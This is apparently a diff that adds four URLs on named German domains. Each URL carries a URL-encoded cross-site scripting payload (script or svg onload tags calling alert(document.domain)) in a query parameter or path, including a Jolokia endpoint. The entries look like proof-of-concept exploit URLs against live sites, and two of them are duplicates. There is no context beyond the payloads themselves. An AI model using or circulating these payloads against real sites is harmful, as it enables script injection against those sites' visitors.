@@ -1,0 +1,4 @@
+http://deprecated.drinkware.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+http://deutsche-gewinnboerse.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://deutsche-gewinnboerse.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://dfxserv.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
